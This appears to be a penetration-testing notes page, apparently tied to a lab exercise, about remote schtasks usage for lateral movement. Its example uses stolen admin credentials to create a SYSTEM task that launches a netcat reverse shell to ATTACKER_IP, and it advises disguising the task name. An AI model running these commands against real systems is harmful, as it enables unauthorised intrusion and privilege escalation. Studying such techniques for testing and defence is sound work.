# schtasks

> The  `schtasks` command can be used to schedule commands and programs to run periodically or at a specific time.

This command generally requires the user to be a member of the **Administrators** group on the remote computer. Refer to the documentation for exact actions that requires this permissions.

It first connects to port 135, before continuing the process on a dynamic port from 49152 to 65535. Refer to the link labelled "_Port numbers used_" in the resources section below for more information.

### Basic commands

{% code title="schtasks create" %}
```powershell
schtasks /s TARGET /ru "SYSTEM" /create /tn "<taskname>" /tr "<command/payload to execute>" /u "<username>" /p "<password>" /sc ONCE /sd 01/01/1970 /st 00:00 
```
{% endcode %}

* `/create` : Specify to create task
* `/s`: Specifies the name or IP address of a remote computer (with or without backslashes. Default is the local computer
* `/ru` : Runs that task with permission of the specified user account
  * eg. `/ru "SYSTEM"` runs the task with the **local system account**, a highly privileged account used by the operating system and system services
* `/tn` : Specifies a name for the task
* `/tr` : Specifies the program or command that the task runs
* `/u` , `/p` : command will run as the permissions of the username, and password of the user respectively&#x20;
* `/sc` : To specify the schedule type. Refer to the documentation link below for the full list of values
  * In our case, the value `ONCE` specifies that the task runs once at a specified date and time (see `/sd` and `/st`  below)
  * The `/st` option have to be specified if the value `ONCE` is used
* `/sd`: Specifies the date on which the task schedule starts, defaults to the current date on the local computer
* `/st` : Specifies the start time for the task, using the 24-hour time format&#x20;

{% code title="schtasks run" %}
```powershell
schtasks /s TARGET /run /tn  "<taskname>" /u "<username>" /p "<password>"
```
{% endcode %}

* `/run` : Specify to run task
* `/s` , `/tn`, `/u`  and `/p`: same as schtasks-create

### Example

Suppose we have breached a machine (`mach1`) on the AD network, along with credentials for an admin account (member of the **Administrators** group) that can be used on the target machine (`mach2`). We can perform the following sequence of commands to obtain a privileged reverse shell on the target machine (`mach2`). Let's assume the obtained admin credentials are: `admin` , `pass` .

> Assume that `nc64.exe` is present on the target machine, or we have somehow managed to upload a reverse shell payload via a SMB share, etc.

{% code title="mach1 (breached machine)" overflow="wrap" %}
```powershell
# ofcourse we want to change the taskname  to something less suspicious 
#(1)
C:\> schtasks /create /s mach2.xxxx /ru "SYSTEM" /u "admin" /p pass /tn "revshell" /tr "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP <PORT>" /sc ONCE /sd xxxx /st xxx 

#(2) same command as (1), just with different payload
C:\> schtasks /create ... /ru "SYSTEM" /tn "revshell" /tr "%windir%\rvshell.exe"  

C:\> schtasks /run /s mach2.xxxx  /tn  "revshell" 
```
{% endcode %}

The `/ru "SYSTEM"` option specifies to run the task as the local system account, that allows us to gain a privileged shell.

#### Cleanup

```powershell
C:\> schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

### Resources

1. Official `schtasks`  documentation:

{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create" %}

2. Port numbers used:

{% embed url="https://serverfault.com/questions/899954/which-port-is-used-for-running-schtasks-exe-in-a-remote-computer" %}
